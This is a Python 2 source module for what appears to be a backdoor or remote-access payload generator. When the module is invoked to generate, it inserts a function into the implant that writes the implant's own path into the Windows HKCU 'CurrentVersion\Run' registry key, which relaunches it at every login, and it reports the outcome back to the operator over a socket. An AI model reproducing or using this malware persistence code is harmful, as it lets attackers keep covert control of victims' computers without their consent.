import library.modules.config as config

config.main()

def main(option):
    if option == 'generate':
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import _winreg')
        config.import_statements.append('import sys')
        config.functions.append('''
def createPersistKey(path):
    global s
    try:
        aReg=_winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
        aKey=_winreg.CreateKeyEx(aReg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,_winreg.KEY_WRITE)
        _winreg.SetValueEx(aKey, 'Startup_Win_Reg',0,_winreg.REG_SZ, path)
        _winreg.FlushKey(aKey)
        _winreg.CloseKey(aKey)
        _winreg.CloseKey(aReg)
        s.sendall('[+]Persistence achieved')
    except Exception as e:
        s.sendall('[!]Exception: '+str(e))''')
        config.logics.append('''
            elif command == "reg_persist":
                createPersistKey(sys.argv[0])''')
    elif option == 'info':
        print '\nName             : Registry Persistence' \
              '\nOS               : Windows' \
              '\nRequired Modules : _winreg, sys' \
              '\nCommands         : reg_persist' \
              '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry folder\n' \
              '\nAdditional Info  : Coded by ev-ev'